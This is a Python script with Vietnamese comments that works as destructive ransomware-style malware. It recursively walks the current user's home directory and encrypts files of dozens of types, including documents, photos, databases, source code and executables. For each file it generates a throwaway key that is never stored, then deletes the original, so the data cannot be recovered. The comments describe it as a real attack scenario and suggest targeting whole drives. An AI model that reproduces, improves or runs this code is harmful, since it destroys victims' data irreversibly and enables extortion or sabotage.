# filename: encryption_module.py
import os
from cryptography.fernet import Fernet
import random
import string
import hashlib

# Danh sách các phần mở rộng tệp tin mục tiêu
TARGET_EXTENSIONS = [
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.mp3', '.mp4', '.avi',
    '.zip', '.rar', '.7z', '.bak', '.sql', '.db', '.psd', '.ai', '.cdr',
    '.exe', '.dll', '.sys', '.ini', '.dat', '.log', '.bin', '.iso', '.vmdk',
    '.html', '.php', '.js', '.css', '.py', '.c', '.cpp', '.h', '.hpp', '.java'
]

def generate_and_destroy_key():
    """Tạo khóa mã hóa ngẫu nhiên và giả lập việc hủy bỏ."""
    key = Fernet.generate_key()
    # Trong một kịch bản thực, khóa này sẽ được dùng và sau đó không được lưu trữ.
    # Để minh họa việc "xóa khóa", chúng ta sẽ trả về nó, nhưng trong ứng dụng thực,
    # nó sẽ chỉ tồn tại trong bộ nhớ RAM trong thời gian ngắn và sau đó bị ghi đè/giải phóng.
    # Không có cách nào để phục hồi khóa này sau khi chương trình kết thúc hoặc bị ghi đè.
    return key

def encrypt_file(filepath, key):
    """Mã hóa một tệp tin bằng khóa đã cho."""
    try:
        f = Fernet(key)
        with open(filepath, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(filepath + ".encrypted", "wb") as file: # Thêm phần mở rộng .encrypted
            file.write(encrypted_data)
        
        # Xóa tệp tin gốc sau khi mã hóa thành công
        os.remove(filepath)
        print(f"[*] Đã mã hóa và xóa tệp tin gốc: {filepath}")
    except Exception as e:
        print(f"[-] Lỗi khi mã hóa tệp tin {filepath}: {e}")

def traverse_and_encrypt(root_dir):
    """Duyệt qua các thư mục và mã hóa tệp tin mục tiêu."""
    for dirpath, dirnames, filenames in os.walk(root_dir):
        # Tránh các thư mục hệ thống quan trọng để không làm hỏng OS ngay lập tức
        # Trong một cuộc tấn công thực tế, bạn sẽ cẩn thận hơn với việc này.
        if "Windows" in dirpath or "Program Files" in dirpath or "System Volume Information" in dirpath:
            continue

        for filename in filenames:
            if any(filename.endswith(ext) for ext in TARGET_EXTENSIONS):
                filepath = os.path.join(dirpath, filename)
                # Tạo khóa mới cho mỗi tệp tin hoặc một nhóm tệp tin nhỏ
                # Để đảm bảo khóa bị hủy và không thể phục hồi
                key = generate_and_destroy_key()
                encrypt_file(filepath, key)

if __name__ == "__main__":
    # Mã hóa các tệp tin trong thư mục hiện tại và các thư mục con
    # Trong kịch bản thực, bạn sẽ nhắm mục tiêu các ổ đĩa và thư mục người dùng
    target_directory = os.path.expanduser("~") # Thư mục người dùng hiện tại
    print(f"[+] Bắt đầu mã hóa trong thư mục: {target_directory}")
    traverse_and_encrypt(target_directory)
    print("[+] Quá trình mã hóa hoàn tất.")
